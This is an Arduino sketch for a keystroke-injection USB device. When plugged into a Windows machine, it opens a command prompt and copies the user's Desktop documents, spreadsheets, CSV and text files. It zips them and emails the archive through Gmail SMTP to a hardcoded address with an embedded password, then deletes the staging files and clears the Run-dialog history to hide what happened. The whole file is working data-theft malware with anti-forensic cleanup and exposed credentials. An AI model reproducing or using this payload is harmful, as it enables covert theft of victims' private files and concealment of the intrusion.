
#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(100);
  Keyboard.release(key);
}

void wait(int fir, int sec)
{
  delay(fir);
  typeKey(KEY_RETURN);
  delay(sec);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);
  
  delay(1000);
  
  Keyboard.print("mkdir %USERPROFILE%\\Documents\\mimi");

  wait(100, 1000);
  
  Keyboard.print("xcopy /c /q /g /i /e /h /y %USERPROFILE%\\Desktop\\*.docx %USERPROFILE%\\Documents\\mimi\\doc");
  
  wait(100, 10000);
  
  Keyboard.print("xcopy /c /q /g /i /e /h /y %USERPROFILE%\\Desktop\\*.xslx %USERPROFILE%\\Documents\\mimi\\excel");
  
  wait(100, 10000);
  
  Keyboard.print("xcopy /c /q /g /i /e /h /y %USERPROFILE%\\Desktop\\*.csv %USERPROFILE%\\Documents\\mimi\\csv");
  
  wait(100, 10000);
  
  Keyboard.print("xcopy /c /q /g /i /e /h /y %USERPROFILE%\\Desktop\\*.txt %USERPROFILE%\\Documents\\mimi\\txt");
  
  wait(100, 10000);
  
  Keyboard.print("powershell -command \"Compress-Archive -Path $env:USERPROFILE\\Documents\\mimi -DestinationPath $env:USERPROFILE\\Documents\\MIMI -CompressionLevel \"Optimal\" -Force\"");
  
  wait(100, 100);

  Keyboard.print("powershell -command \"$smtp = New-object Net.Mail.SmtpClient(\"smtp.gmail.com\", \"587\"); $smtp.EnableSsl = $true; $email = \"franklinyou55@gmail.com\"; $pass = \"YouAre1337\"; $mail = new-Object Net.Mail.MailMessage; $mail.From = \"$email\"; $mail.To.Add(\"$email\"); $mail.Subject = \"report\"; $mail.Body = \"You are 1337\"; $mail.Attachments.Add(\"$env:USERPROFILE\\Documents\\MIMI.zip\"); $smtp.Credentials = new-Object System.Net.NetworkCredential(\"$email\", \"$pass\"); $smtp.send($mail);");
 
  wait(100, 5000);
  
  /* clean up data */

  Keyboard.print("rmdir /S %USERPROFILE%\\Documents\\mimi");
  
  wait(100, 500);
  
  Keyboard.print("y");

  typeKey(KEY_RETURN);

  delay(200);
  
  Keyboard.print("del %USERPROFILE%\\Documents\\MIMI.zip");
  
  wait(100, 500);

  Keyboard.print("powershell -command \"Remove-ItemProperty -Path 'HKEY_CURRENT_USER:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\' -Name '*'\"");
  
  wait(100, 1000);
  
  /* exit cmd */
  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  delay(200);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
